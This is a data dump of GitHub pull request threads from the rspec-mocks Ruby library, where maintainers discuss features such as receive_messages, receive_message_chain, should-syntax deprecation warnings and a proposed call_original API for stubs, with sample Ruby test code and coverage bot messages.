584,rspec/rspec-mocks,399.0,Further to #368 this allow multiple message allowances/expectations via `receive_messages`.,"['As promised, refactored to use the improvements from #401', 'Whats the story with #401 and #404 and this?', ""#401 is broken, if it needs to be re-implemented this patch will have to change too. I need to understand how this PR interacts with it. Didn't leave myself enough time to do that tonight, unfortunately."", ""@myronmarston I've added in specs covering what happens when you attempt to use the negative (I'm disallowing it) but I'm having trouble consistently getting a partial mocking failure. What **should** trigger it? I don't want to create order dependant specs..."", 'Ping! Any advice?', 'Here\'s an example of a spec that fails (but should pass) for the partial mock case:\r\n\r\n``` ruby\r\nmodule RSpec\r\n  module Mocks\r\n    describe ""allow(...).to receive_messages(:a => 1, :b => 2)"" do\r\n      context ""on a partial mock object"" do\r\n        it \'gets reset properly after the example\' do\r\n          obj = Object.new\r\n          def obj.a; ""original""; end\r\n\r\n          allow(obj).to receive_messages(:a => 1, :b => 2)\r\n\r\n          expect {\r\n            reset obj\r\n          }.to change { obj.a }.from(1).to(""original"")\r\n        end\r\n      end\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nAlso, this is now at 21 commits and counting.  There\'s a lot of noise in there.  It would be nice if this got squashed into a more reasonable number of commits before we merge this :).', ""I'll squash this before we merge it but I'm leaving the history until I'm ready for that :)"", '\n[![Coverage Status](https://coveralls.io/builds/200500/badge)](https://coveralls.io/builds/200500)\n\nCoverage decreased (-0.06%) when pulling **c3bdeff0ddbc4c321a96925ac5b8b3580fa977b7 on receive_messages** into **3ac6f4e0155db12aa1ecbfe20d710e2d90c581fa on master**.\n', ""Ok, this now resets partial mocks properly (it was actually a fairly trivial change as we have a separate `PartialMockProxy` to handle this).\r\n\r\nOne thing I haven't done, and this is deliberate cause my head hurts just thinking about it, is handle resetting 'any_instance' stubs/expectations, because they are already reset entirely separately from everything else, and I'm using the existing stub/expectation functionality for those (it's not new code).\r\n\r\nThey already don't reset cleanly, so I figure that's a new issue."", ""> They already don't reset cleanly, so I figure that's a new issue.\r\n\r\nThat's news to me.  Can you open an rspec-mocks issue includes a code snippet that demonstrates the problem?"", 'Merged.  Thanks @JonRowe!', ""Weren't we going to squash this? :P "", 'Oh yeah.....too late now, I guess.', 'Yup, oh well :)', ':+1: ']"
585,rspec/rspec-mocks,339.0,"This is for RSpec 3 with a view to letting users know that this syntax will be off by default in 4. I seem to recall that there was some discussion of this, but I couldn't find the exact issue/mailing list post. I'll bake one for rspec-expectations whilst I'm on the plane :cat: ","['\n[![Coverage Status](https://coveralls.io/builds/100634/badge)](https://coveralls.io/builds/100634)\n\nCoverage remained the same when pulling **44f35a51df108a59337865e8ea5318e7e9a64dc8 on samphippen:warn_about_the_should_syntax** into **6ef6f11c3c7570e57685d3840745b9549850e734 on rspec:master**.\n', ""Somehow I missed the decision. I thought since the `should` syntax doesn't have much maintenance cost, we had no plans to deprecate or remove it, except to start enabling it only in generated `spec_helper.rb` files."", ""(If it's not obvious, I'm :-1: this change because this will spew warnings for all but the very newest test suites, and it's not entirely automatable to change the syntax)"", 'It warns precisely once for the entire suite as opposed to on every should.\r\nIt emits the warning once on the first should and then Not again. Hardly\r\n""spewing warnings"".\r\n\r\nSent from my phone please excuse my brevity.\r\n\r\nOn 4 Jul 2013, at 18:03, Andy Lindeman <notifications@github.com> wrote:\r\n\r\n(If it\'s not obvious, I\'m [image: :-1:] this change because this will spew\r\nwarnings for all but the very newest test suites, and it\'s not entirely\r\nautomatable to change the syntax)\r\n\r\n\xe2\x80\x94\r\nReply to this email directly or view it on\r\nGitHub<https://github.com/rspec/rspec-mocks/pull/339#issuecomment-20484300>\r\n.', ""I just worked out where the discussion was. It's on the 3.0 release post\r\ngist. Won't link on case @myronmarston wants to keep it under wraps for\r\nnow. @alindeman you should have access to it :).\r\n\r\nSent from my phone please excuse my brevity.\r\n\r\nOn 4 Jul 2013, at 18:03, Andy Lindeman <notifications@github.com> wrote:\r\n\r\n(If it's not obvious, I'm [image: :-1:] this change because this will spew\r\nwarnings for all but the very newest test suites, and it's not entirely\r\nautomatable to change the syntax)\r\n\r\n\xe2\x80\x94\r\nReply to this email directly or view it on\r\nGitHub<https://github.com/rspec/rspec-mocks/pull/339#issuecomment-20484300>\r\n."", '\n[![Coverage Status](https://coveralls.io/builds/100672/badge)](https://coveralls.io/builds/100672)\n\nCoverage remained the same when pulling **f14c98f423ca944c9e33163dc7e8f826b9df6b05 on samphippen:warn_about_the_should_syntax** into **6ef6f11c3c7570e57685d3840745b9549850e734 on rspec:master**.\n', '> Somehow I missed the decision. I thought since the should syntax doesn\'t have much maintenance cost, we had no plans to deprecate or remove it, except to start enabling it only in generated spec_helper.rb files.\r\n\r\nWe have no plans to remove it.  Given that we think the `expect` syntax is superior, and that we\'d like to move in the direction of making rspec do zero monkey patching by default, the plan we had discussed was for `should` to still be enabled by default in RSpec 3 but to have it issue a ""you should explicitly enable this"" warning, and then in RSpec 4 it will be disabled by default.  That\'ll help make our preference clear, and help nudge folks towards explicitly configuring the syntax if they want to continue using `should`.\r\n\r\nAnyhow, let\'s hold off on this for now.  I want to get community feedback on it first (based on the RSpec 3 blog post).  There are plenty of other rspec 3 things we can work on in the meantime (e.g. removing stuff that\'s been deprecated for a long time).', '> It warns precisely once for the entire suite as opposed to on every should. It emits the warning once on the first should and then Not again. Hardly ""spewing warnings"".\r\n\r\nIt\'s true. I didn\'t look closely enough. Sorry @samphippen.\r\n\r\n> We have no plans to remove it. Given that we think the expect syntax is superior, and that we\'d like to move in the direction of making rspec do zero monkey patching by default, the plan we had discussed was for should to still be enabled by default in RSpec 3 but to have it issue a ""you should explicitly enable this"" warning, and then in RSpec 4 it will be disabled by default. That\'ll help make our preference clear, and help nudge folks towards explicitly configuring the syntax if they want to continue using should.\r\n\r\nAh, OK. Basically I misread the code and misinterpreted the text here. If it\'s possible to squash the warning by enabling the syntax explicitly, I\'m supportive.\r\n\r\nSorry for the knee jerk reaction.', ':+1: but also we need to hold off merging this until we get community feedback', "">  but also we need to hold off merging this until we get community feedback\r\n\r\nAlso, I have some code review feedback but don't have the time to write it up at the moment..."", 'Should I close this but leave the branch around, I feel like we should maybe start with a community community poll first.', '@samphippen - The feedback to my RSpec 3 blog post (where I mentioned we would emit a warning like this) was universally positive.  I consider that to be a sufficient poll.', ""Thanks for reminding me to review this, though...I'll try to review it this weekend.  If you want to rebase before then, feel free."", '@myronmarston go at it :D', '\n[![Coverage Status](https://coveralls.io/builds/176400/badge)](https://coveralls.io/builds/176400)\n\nCoverage decreased (-0.09%) when pulling **ff83d8af5bacbc71976241e2821631b7d57e3b62 on samphippen:warn_about_the_should_syntax** into **80d70b43bcc373f9e69c11c402fee39ca1ead5ea on rspec:master**.\n', '@myronmarston plz review when you can :heart: ', '@samphippen -  code review feedback left.', '\n[![Coverage Status](https://coveralls.io/builds/192075/badge)](https://coveralls.io/builds/192075)\n\nCoverage increased (+0.38%) when pulling **23eb5267912ca928abb8d4e5f2c6ff44e894e986 on samphippen:warn_about_the_should_syntax** into **80d70b43bcc373f9e69c11c402fee39ca1ead5ea on rspec:master**.\n', ""@myronmarston I took a quick look through your comments, I think I got them all, I added a spec for the default then should case you asked about, you were right it wasn't doing the right thing, but it does now. More review welcomed. (Also got some help from @JonRowe on this one when we bumped into each other today in london)"", ""Looking good.  Very close to being ready to merge :).  Left a couple final comments.  (Sorry about noticing some of this on the last review...).\r\n\r\nAlso, `Update should warnings for myron's changes.` is kinda a weird commit message.  I haven't made any changes here."", "">Also, Update should warnings for myron's changes. is kinda a weird commit message. I haven't made any changes here.\r\n\r\nyou're totally right. tired git driving leads to bad commit messages. I'll squash everything together once I'm done here."", '\n[![Coverage Status](https://coveralls.io/builds/199975/badge)](https://coveralls.io/builds/199975)\n\nCoverage decreased (-0.16%) when pulling **75f9f602e16a8cf5c40dc311eaaf8e79127ae228 on samphippen:warn_about_the_should_syntax** into **3ac6f4e0155db12aa1ecbfe20d710e2d90c581fa on rspec:master**.\n', '@myronmarston please rereview when you can. I took most of your notes. Good catches :sparkles: ', '\n[![Coverage Status](https://coveralls.io/builds/201379/badge)](https://coveralls.io/builds/201379)\n\nCoverage remained the same when pulling **cf4d4c9d52490103a48232502958fdd7d37c04e4 on samphippen:warn_about_the_should_syntax** into **3ac6f4e0155db12aa1ecbfe20d710e2d90c581fa on rspec:master**.\n', 'Thanks, @samphippen!  I just merged it.  I also added some additional doc comments in f96edc3c4db2f06703d9e1d97f2507c25d1145e8.\r\n\r\nCan you take care of adding this kind of thing to rspec-expectations as well?', ""Also, BTW: while it's nice to not a ton of tiny commits to merge, in the future please don't continually amend your commits as we do the back-and-forth of a code review.  It makes it harder to see what changed since I last looked at the PR when you've amended commits or squashed them together."", 'One other thing...we forgot a changelog entry.  I added one in b34488c3755aa800145f0df6d087fe16083d8f0b']"
586,rspec/rspec-mocks,382.0,"I had a discussion with @myronmarston about a problem I ran into during the conversion of our RSpec suite to the new expect/allow syntax. The gist of it can be found [here](https://gist.github.com/BjRo/6077571).

Funnily what I thought was a bug, never quite worked the way I thought it was and I refactored the spec after reading his suggestions. Myron asked me to also add an issue for it, though. So here we go :-)

The spec we talked about had used the following expectation. 

```ruby
CachedUser.should_receive(:where) do |args|
    expect(args[:id]).to have(3).items
    expect(contact_ids).to include(*args[:id])
end.and_call_original
``` 
The values passed to 'where' are sort of random so you can't really setup an argument matcher with 'with'. That's why we tried to verify them in the block. The whole code under test there was also part of an AREL call comparable to this one. That's where the 'and_call_original' came into the game

```ruby
CachedUser.where(id: random_related_user_ids).all
```
The spec passed. Though, as Myron pointed out, 'and_call_original' completely replaces the block expectation, resulting in the inner expectations never to be executed. 

That was a bit surprising to find out, but to be honest also a fault on my side, since I probably never saw the expectation fail in the first place :-/

To make that behavior more obvious I think it would be good to either raise an exception or to output a warning in that case.







","['\n[![Coverage Status](https://coveralls.io/builds/132669/badge)](https://coveralls.io/builds/132669)\n\nCoverage decreased (-0%) when pulling **c05a378dfafa6e69c191a2bc1733da8ce8dbb111 on warn_when_overriding_implementation** into **92026151ed9af3741afff708dde467ff468af01b on master**.\n', 'Awesome, thx!', ""In @BjRo's gist, it also came up that an expression like this:\r\n\r\n``` ruby\r\n      expect(CachedUser).to receive(:where) do |args|\r\n        expect(args[:id]).to have(3).items\r\n        expect(contact_ids).to include(*args[:id])\r\n      end.and_call_original\r\n```\r\n\r\n...raises a confusing error (`NoMethodError: undefined method 'and_call_original' for []:Array`).  It would be good to fix that as well."", '\n[![Coverage Status](https://coveralls.io/builds/239703/badge)](https://coveralls.io/builds/239703)\n\nChanges Unknown when pulling **d8bca948097e7951663863292b831d7c92417d19 on warn_when_overriding_implementation** into ** on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/239734/badge)](https://coveralls.io/builds/239734)\n\nChanges Unknown when pulling **650bee85b6c48d2f43fc5018471f9ba5be65a3e3 on warn_when_overriding_implementation** into ** on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/239749/badge)](https://coveralls.io/builds/239749)\n\nChanges Unknown when pulling **650bee85b6c48d2f43fc5018471f9ba5be65a3e3 on warn_when_overriding_implementation** into ** on master**.\n', 'Ready for a review I guess.', 'Could final commit be squashed into another?', 'Looks good otherwise when build is green.', ""It's awaiting rspec/rspec-core#1024 (to sync the warning stuff)"", '\n[![Coverage Status](https://coveralls.io/builds/245034/badge)](https://coveralls.io/builds/245034)\n\nChanges Unknown when pulling **894dd8b21e9b3470171325522a3c59ee169888cb on warn_when_overriding_implementation** into ** on master**.\n', 'Actually I think we can merge this now and sync up the warnings stuff later if need be', ""Yeah I don't see a reason to gate this on the core PR. Worst case scenario we just need to come back here and change it again if core PR changes, that's not terrible."", '\n[![Coverage Status](https://coveralls.io/builds/245043/badge)](https://coveralls.io/builds/245043)\n\nChanges Unknown when pulling **659b039405bbb4df9532e60c3503ae066757bb76 on warn_when_overriding_implementation** into ** on master**.\n', ""This looks good, but did we address the other odd error (`NoMethodError: undefined method 'and_call_original' for []:Array`) I [mentioned above](https://github.com/rspec/rspec-mocks/pull/382#issuecomment-21842873) ?"", 'Hmm, no, but thats a block capture issue... e.g.\r\n\r\n```Ruby\r\nexpect(user).to receive(:where) do |args|\r\n  expect(args[:id].size).to eq 3\r\nend.and_call_original\r\n```\r\n\r\nproduces the weird error\r\n\r\n```Ruby\r\nexpect(user).to( receive(:where) do |args|\r\n  expect(args[:id].size).to eq 3\r\nend.and_call_original )\r\n```\r\n\r\nWorks fine.\r\n\r\n', ""Ah...I know what's going on: that expression passes the block to `to` due to ruby's precedence rules.  So `and_call_original` is being called from the return value of `to`. which is the return value of `handle_matcher`, which returns whatever `matcher.matches?` returns, which, in this case, is returning `@recorded_customizations`, which is an array:\r\n\r\nhttps://github.com/rspec/rspec-mocks/blob/f434af58f87937aa09c44b4f50719aaa836bf6b0/lib/rspec/mocks/matchers/receive.rb#L76-L78\r\n\r\nSo, I think if we changed `RSpec::Mocks::Matchers::Recive#setup_method_substitute` to return `expectation`, it would allow further chaining.  Want to take a stab at writing a failing spec, adding that, and seeing if it passes?""]"
587,rspec/rspec-mocks,425.0,"It is confusing to have different behaviour depending on whether the
block has arguments or not, and there are better ways to do this.

References #377.","[""Hold off on this ... I'm working on actual removal of this and think I may have confused myself."", ""OK so this message is kind of right. Passing arguments isn't exactly deprecated, it's just the behaviour will change. I'm inclined to just keep this messaging to encourage people to move to the other forms."", 'Please take a look now.', 'Thanks, @xaviershay!']"
588,rspec/rspec-mocks,439.0,"Register invokation order of calls and use it to verify that spies
have been called in order correctly.

Fixes #430.","['Updated the wording too.', 'Refactored the loop, refactored the object message tuple to use a value objects. Ready for re-review.', 'LGTM.  Merge away.']"
589,rspec/rspec-mocks,467.0,First pass. Comments on the back of a PR :),"[""I don't see anything here for:\r\n\r\n``` ruby\r\nexpect(k).to receive_message_chain(...)\r\nallow_any_instance_of(k).to receive_message_chain(...)\r\nexpect_any_instance_of(k).to receive_message_chain(...)\r\n```"", ""Also, what about block implementations?  I don't see any specs showing that working."", ""> Also, what about block implementations? I don't see any specs showing that working.\r\n\r\nI've now added these.\r\n\r\n"", ""Good work @samphippen! Will need a change log entry of course and I'd like to see these commits squashed?"", ""@myronmarston I have to get on a plane now, but I think I've addressed all the feedback. Can you take another look through this and tell me what you think when it goes green?\r\n\r\nThanks :smile: \r\n\r\nI'll add a changelog in ~8 hours when I get off the plane."", 'This is looking really fantastic @samphippen -- almost ready to merge.  Left a couple more comments.  (The big one is the suggestion to refactor `StubChain` to leverage polymorphism rather than a bunch of conditionals).  Also, it would be great if you could squash this before we merge.  Thanks!', ""@myronmarston I just realised this still doesn't work with and_call_original. I'll take a look at that."", ""@myronmarston can you check this branch out and run the specs? There's some kind of horrifying stack overflow happening now that I'm trying to call real methods on the object to make and_call_original work, I'm not really sure what's going on but it's somehow related to this send: https://github.com/rspec/rspec-mocks/blob/master/lib/rspec/mocks/any_instance/recorder.rb#L185 calling the method over again. I've tried to debug but really am not sure what to do."", ""@myronmarston I've committed and pushed this back to the failure that I saw in it's original form, which is a different infinite recursion. Either way it seems that `send`ing the real message to the object (for and_call_original) on an any instance expectation breaks hard, due to the way we define methods on instances captured by any_instance expectations."", ""Has `and_call_original` ever worked with `stub_chain`?  If not, I'm OK just marking the test pending and coming back to it later."", ""It hasn't. I'll make the test pending."", ""@myronmarston can you give this another onceover, I'm pretty happy with it now but would like thoughts if you have them. After that I'll squash it and merge it."", ""This is very close now :).  Left a largeish comment on the implementation of `StubChain` but that's basically it."", '@myronmarston thoughts on the new chain classes?', ""> @myronmarston thoughts on the new chain classes?\r\n\r\n:+1: I think it's organized better now.  Do you like it better or worse?"", ""> :+1: I think it's organized better now. Do you like it better or worse?\r\n\r\n\r\nI'm down with this. I particularly like how chain_on got pushed into one place."", ""@myronmarston I've updated based on your feedback. \r\n\r\nI've noticed that if you've set an expectation/allowance before you created a chain, and that expectation/allowance returns nil you get a stubbing method on nil warning. I'm not sure how you feel about that, but I'm pretty sure it's an inevitable consequence."", '@myronmarston can you take a look at this please?', ""> I've noticed that if you've set an expectation/allowance before you created a chain, and that expectation/allowance returns nil you get a stubbing method on nil warning. I'm not sure how you feel about that, but I'm pretty sure it's an inevitable consequence.\r\n\r\nIt's the correct behavior.  That said, you could avoid it in your test by doing something like:\r\n\r\n``` ruby\r\nallow(obj).to receive(:foo).and_return(double)\r\nallow(obj).to receive_message_chain(:foo, :bar, :bazz)\r\n```\r\n\r\n...because then it would be stubbing the returned `double` rather than the implicitly returned `nil`.\r\n\r\nThis is looking great, @samphippen :)."", 'Woohoo this is coming along nicely! Good job :) :+1: ', '@myronmarston thoughts on `matching_expectation.invoke_without_incrementing_received_count` and the implementation there in?', ""LGTM.  Let's squash this down and merge it!\r\n\r\nBTW, if it's not too much trouble to backport this to 2.99, that would be nice, as I suspect that transpec will be gain the ability to do the conversion and it would be nice to convert to this as folks upgrade.  Not essential though."", ""@myronmarston /me wipes sweat of brow. Well that was fun. I'll squash it down to one commit, and then cherry pick it across to 2-99 assuming that's sufficiently easy."", 'woohooo!! This makes me a really happy camper :+1: ', ""@myronmarston I had a crack at reconciling this with 2-99 and failed to merge it properly. I'll take another go tomorrow, but this may be unsurprising: these things are now quite out of sync."", ""@myronmarston couldn't merge this into 2-99. I think we'll just leave it for 3.0.0?"", ""What happened to:\r\n\r\n```ruby\r\nexpect(something).to receive_message_chain('whatever.something').with(?)\r\n```\r\n\r\n?"", ""> @myronmarston couldn't merge this into 2-99. I think we'll just leave it for 3.0.0?\r\n\r\nI'm fine with that.\r\n\r\n@mhenrixon -- did `stub_chain` support `with`?  (Shows you how rarely I've used that feature). What are it's semantics?  Is it just constraining the last message?\r\n"", ""Oh sorry about that I thought you guys could read my mind! \r\n\r\nNo stub_chain didn't support this but stub_chain wasn't an expectation either so to make it truly useful I would `expect` that `.with(args)` just constrains the last message. Think @samphippen already suggested this in the originating issue?"", '> No stub_chain didn\'t support this but stub_chain wasn\'t an expectation either so to make it truly useful I would expect that `.with(args)` just constrains the last message. Think @samphippen already suggested this in the originating issue?\r\n\r\nThe reason we now support `expect(...).to receive_message_chain` is because the new allow vs expect + a matcher approach made it fall out naturally.  We have a lot of other stuff to work on for RSpec 3 and I\'m not convinced that adding `with` is a good idea.  `receive_message_chain` is specifying multiple messages.  There are multiple ways to interpret what `with` means.  For example, someone could reasonably think it works like this:\r\n\r\n```ruby\r\nexpect(obj).to receive_message_chain(""foo.bar.bazz"").with(1).with(2).with(3)\r\nobj.foo(1).bar(2).bazz(3)\r\n```\r\n\r\n...or like this:\r\n\r\n``` ruby\r\nexpect(obj).to receive_message_chain(""foo.bar.bazz"").with(1)\r\nobj.foo(1).bar(1).bazz(1)\r\n```\r\n\r\n...or like this:\r\n\r\n``` ruby\r\nexpect(obj).to receive_message_chain(""foo.bar.bazz"").with(1)\r\nobj.foo(1).bar.bazz\r\n```\r\n\r\n...or like this:\r\n\r\n``` ruby\r\nexpect(obj).to receive_message_chain(""foo.bar.bazz"").with(1)\r\nobj.foo.bar.bazz(1)\r\n```\r\n\r\nIt\'s ambiguous (or at least, reasonable to interpret in different ways).\r\n\r\nIf you care what arguments are received, then use the existing tools available to you.']"
590,rspec/rspec-mocks,617.0,Fixes #594,"[""There's also a `failing_argument_matchers_spec.rb` file that could/should be merged into your new one."", 'Looks good.  Left a few comments but no blockers.  13 commits seems like a lot of git log noise for the amount of change here...what do you think about squashing the commits into one?\r\n\r\nNeeds a changelog entry, too.', ""I'll squash and do the changelog when done :)"", ""Actually I decided to squash them now, anyway I've pulled in the failure specs too."", 'LGTM, merge when green.']"
591,rspec/rspec-mocks,682.0,"Use `format_args` for expected in `raise_expectation_error`, it was the one place where we weren't formatting args for expected so you didn't get nice messages. Note the spec is a bit weird because if you meet the expectation you get the correct error message without the patch (as it raises a different error).

Fixes #676","['So this only fixes part of the issue I reported in #676:\r\n\r\n```\r\n     Failure/Error: expect(foo).to receive(:bar).with(instance_of Fixnum)\r\n       (Double).bar(an_instance_of(Fixnum))\r\n           expected: 1 time with arguments: (an_instance_of(Fixnum))\r\n           received: 0 times with arguments: (#<RSpec::Mocks::ArgumentMatchers::InstanceOf:0x007fad94967dc0 @klass=Fixnum>)\r\n\r\n     Failure/Error: expect(foo).to have_received(:bar).with(instance_of Fixnum)\r\n       (Double).bar(an_instance_of(Fixnum))\r\n           expected: 1 time with arguments: (an_instance_of(Fixnum))\r\n           received: 0 times with arguments: (#<RSpec::Mocks::ArgumentMatchers::InstanceOf:0x007fad93109828 @klass=Fixnum>)\r\n```', 'Actually, for the `received` line, rather than showing the argument matchers it seems like it should say ""received: 0 times"" or ""received: 1 time with arguments: ({the actual args that didn\'t match rather than the arg matcher})"".', 'Yeah that\'s odd, it should say ""received: 0 times""', 'is this a regression or related to a new feature? (i.e. can we ship 3 without it?)', ""It's a bug fix, but not a regression, I'm going to do another tweak later to get the final part of this (mostly I just havent written a spec to find it yet)"", 'ping @myronmarston, I tweaked this again, but man is the error generator one pig to work with :/', '> ping @myronmarston, I tweaked this again, but man is the error generator one pig to work with :/\r\n\r\nGot any suggestions for a better design for the error generator?\r\n\r\nAnyhow, LGTM, but needs a changelog before merging.', 'Thanks, @JonRowe!', '> Got any suggestions for a better design for the error generator?\r\n\r\nNot at the moment, I think it might be worth having unit level specs for it at some point, to make changing it easier.']"
592,rspec/rspec-mocks,695.0,"This is the work I've done so far for #591.  I'm not done yet but it's at a point where it's worth getting feedback.

My focus here is on making are relish docs really first-class, where they are written to read as documentation first, and to serve as regression tests second.  (I feel like our spec coverage is generally good enough for most things.)

I've been using a staging environment to preview how this renders on relish, making sure it looks good as I go:

https://relishapp.com/rspec-staging/rspec-mocks/docs

There are still some of the old cukes in `features-old`. As I've been going along I've been deleting ones that were either covered by new cukes (in `features`) or that I was sure had spec coverage. The ones that are left are ones we need to look into a bit more.

Still TODO:

- [ ] Add a README.md file for the basics directory. Not sure what to put in there yet given there's already a root README with the same kind of info.
- [x] Add a section for the old `:should` syntax (see #591 for an early idea of what this would be).
- [x] Add an ""outside rspec"" section (again, see #591)
- [x] Deal with the rest of the `features-old` cukes (migrating them to specs as necessary to provide missing coverage).
","['Is the line length adjustment of the text lines of the cukes for relish formatting?', ""I had a skim and left a few nit picks, it's hard to judge all of these :/"", ""> I had a skim and left a few nit picks, it's hard to judge all of these :/\r\n\r\nI addressed all your nit picks."", ""When you're done I'll have a sit down and try to read all the docs, (my previous comment referred to the fact it's hard to subjectively judge changes on this scale)."", ""> When you're done I'll have a sit down and try to read all the docs, (my previous comment referred to the fact it's hard to subjectively judge changes on this scale).\r\n\r\nRight...I'm expecting that whoever reviews this will probably view these docs at the staging relish site and leave comments here about that."", ""Yeah, that's my plan, just didn't have time last night and figured it was better to do when it was finished, so I just skimmed the diffs :)"", ""OK, I think this is ready for review now.  Again, the relish staging environment I've been using to view this is here:\r\n\r\nhttps://relishapp.com/rspec-staging/rspec-mocks/docs\r\n\r\nI'd love to get this merged soon and deployed as I think it's such a huge improvement over the existing relish docs."", 'I went through them all on the relish staging site, the majority are fine, a few nit picks left.']"
593,rspec/rspec-mocks,23.0,"<pre>
foo.stub(:bar) do
  # do something relevant to the example
  call_original
end

foo.stub(:bar) do |*args|
  # do something relevant to the example
  call_original(*args)
end
</pre>","['Just out of curiosity, how could this be implemented? I mean, in which scope should call_original be declared?', ""I think we'll need to define a new scope. Right now the block is invoked via `block.call`."", ""I've started working on this, changing the context in which the block is called. Nevertheless, by doing that, you can't use expectations *inside* a return block, since rspec-mocks does not know anything about rspec-expectations. If we want to avoid coupling between expectations and mocks, I can't see a way this could be solved. What do you think? \r\n\r\nhttp://github.com/txus/rspec-mocks/commit/362c9506f794e67f4b03b7902c096bbe27bd5e9d"", ""I've pulled txus commit and change method implementation to calls block in current block context clone. When I tried to do this different way there were always some issues with current block context but as txus said we should avoid dependencies.\r\n\r\ncommit: https://github.com/dnurzynski/rspec-mocks/commit/b109f2485fb7359e3996a968c848921da89639e1\r\n\r\nbranch: https://github.com/dnurzynski/rspec-mocks/commits/call_original_feature\r\n\r\n( pull requests has better view but not sure to use it because of double issues ? )"", ""I'd like to keep an eye on this. I want to be able to set an expectation on all calls in a recursive method call chain *except* the first one. This would let me verify that an ERb template attempts to render its partials."", 'FWIW, you can get this behavior today with a bit of extra work:\n\n``` ruby\noriginal = foo.method(:bar)\nfoo.stub(:bar) do |a, b|\n  do_something_with(a, b)\n  original.call(a, b)\n  do_something_else_with(a, b)\nend\n```', 'I\'ve been thinking more about this.  The proposed API (`call_original`) is great, but all of the proposed solutions involve metaprogramming tricks that I\'m uncomfortable with--not because I don\'t understand what\'s going on (I do) but because it has the potential to cause problems for end users.  Currently, there are 3 ways this could work:\n\n* Eval the implementation block in a different context that has `call_original` available.  This is what @txus\'s solution is doing, if I read it right.  The problem is, instance_eval\'ing the implementation block can create all sorts of confusion for end users because `self` in the block will be different.  It\'s not how it works now and I think we should avoid it.\n* Define `#call_original` on the object that was `self` at the point of block definition.  This is what @dnurzynski\'s solution does.  I think this has less potential for problems than the first solution, but with this approach we\'re adding methods to objects we don\'t own.  There\'s a time and place for that but I would consider it a solution of last resort.\n* Pass the block an additional argument which is the original method; then the user can use `original.call(*args)` wherever they like in their block.  However, it would be a massive breaking change if we suddenly started yielding an extra argument to the block.\n\nOf these, I think the last solution would have the fewest problems if we could find a way to avoid it being a massive breaking change.  To that end, two thoughts:\n\n* We could introduce a config option (e.g. `pass_original_method_to_implementation_blocks` or something like that) that toggles this behavior.\n* We\'ve been discussing a potential new syntax in #153. If/when we add that, we could have that pass the extra original method arg to all block implementations.\n\nOne last thought: I think the most common use cases for this are injecting some logic before or after the original method when it is called.  We could support these with `stub_before` and `stub_after` methods:\n\n``` ruby\nfoo.stub_before(:bar) do |*args|\nend\n\nfoo.stub_after(:bar) do |*args|\nend\n```\n\nWith these, there\'s no need for `call_original` because it is implicit that it the original will be called after the given block (for `stub_before`) or before the given block (for `stub_after`).  This wouldn\'t handle the ""stub around"" case, though.\n\nThoughts?', ""I'd prefer not to add more methods on object to support this behavior, and I agree we should not break existing behavior. What about a new API like this:\n\n```ruby\nintercept(foo, :bar) do |real_object, *args|\n  do_some_stuff_before\n  real_object.bar(*args)\n  do_some_stuff_after\nend\n```\n"", ""That's a pretty good API, but making that work would be quite difficult.  Consider that the `real_object.bar(*args)` within the `intercept` block should not be intercepted (or we'd have infinite recursion)--so we'd have to wrap the calling of the block itself in some kind of messy `without_interceptions { }` mechanism.\n\nOn top of that, that looks like it only works for stubs, not for mocks--i.e. I don't see how `intercept` supports expecting `#bar` will be received on `foo`.\n\nGiven that we're already talking about adding a new syntax (#153), it's a great opportunity to add support for this w/o breaking existing tests and without needing an alternate API just for this.  Conceptually, I think it makes a lot of sense to yield the original method object to block implementations for either a stubbed or mocked method.  Being able to call the original would then fall naturally out of that.\n\nAs an example, if we decide to go with the `on` syntax we've discussed in #153, and added the extra block arg to support this, the code would be like so:\n\n``` ruby\non(foo).stub(:bar) do |orig_bar, *args|\n  do_some_stuff_before\n  orig_bar.call(*args)\n  do_some_stuff_after\nend\n```\n\nActually, one more idea that just popped in my head:\n\n``` ruby\nfoo.stub(:bar).with_original_method do |orig_method, *args|\n  do_some_stuff_before\n  orig_method.call(*args)\n  do_some_stuff_after\nend\n```\n\nEssentially, we add an additional method to the fluent interface that explicitly tells rspec-mocks to yield the original method object to the block implementation.  We could add this w/o breaking anything, but it would be a bit verbose."", ""I'm not 100% sure of the value of self in these examples so bear with me. A few ideas:\n\n```ruby\nfoo.stub(:bar) do\n  # do something relevant to the example\n  original.call\nend\n```\n\n```ruby\nfoo.stub(:bar) do\n  # do something relevant to the example\n  @_original.call\nend\n```\n\nThose are both kind of magic though so I don't really like them. Shorter than other things thrown out there though...\n\n```ruby\nfoo.stub(:bar) do\n  foo.stub.original(:bar).call\nend\n```\n\nThis extends the existing API so maybe you won't like it. I kind of do though because it lets us get at the sub object in a way. That said now the API maybe gets a bit wonky bc sometimes stub stubs something, other times it gets you access to the stub where you can get the original (and presumably not much else at this point). But maybe you like how it reads.\n\n(I'm unsure of whether to use a call to ```#call``` or not...I prefer it because it's consistent with Ruby's block / method API, but I could see people thinking that ```foo.stub.original(:bar)``` might invoke the method. Then again, somebody doing this sort of stuff is probably more advanced and gets the ```#call``` syntax?"", ""We currently don't change the value of `self` in the block implementations, so it would generally be the `RSpec::Core::ExampleGroup` instance that the example is eval'd in.  Your first two ideas seem to depend upon `self` being the stubbed object, so it's probably not going to work unless we instance_eval the block implementation but I want to avoid that (due to the confusion that arises when you change self).\n\nThe `foo.stub.original(:bar).call` idea is interesting.  It'd certainly work without the `instance_eval` or monkey patching gymnastics that some of the original ideas above required.  Not sure I like how it reads, though.\n\nRe: `#call`: I think I'd like the API to provide the original method object and allow users to use `call`.  As you point out, it falls naturally out of ruby.  Any experienced rubyist would expect this API, I think, and users who don't know about method objects need to learn, anyway :)."", 'We could go a tad crazy in order to get the first two interfaces without all the terribleness of `instance_eval`:\n\n```ruby\n\nclass Foo\n  def self.new_block\n    @ivar = ""inside foo""\n    proc { ""#{@ivar} #{call_original}"" }\n  end\nend\n\nblk = Foo.new_block\n\nblk_binding = blk.binding\nblk_binding.eval ""def self.call_original; \'returned from call_original\'; end""\n\nputs blk.call # ""inside foo returned from call_original""\n\n# ... remove call_original method from blk_binding ...\n```\n\nI\'m obviously unconvinced because I\'d never write this kind of code in a production app; however, we are in a mocking library where the rules seem a bit different :)', ""@alindeman -- that's basically what @dnurzynski's solution above does.\n\nI'm uncomfortable doing this, even though this is a mocking library that does highly meta stuff.  Yielding the original method as a block arg seems so much simpler to me."", ""> I'm uncomfortable doing this, even though this is a mocking library that does highly meta stuff. Yielding the original method as a block arg seems so much simpler to me.\n\nI think I agree. I think my favorite so far is the 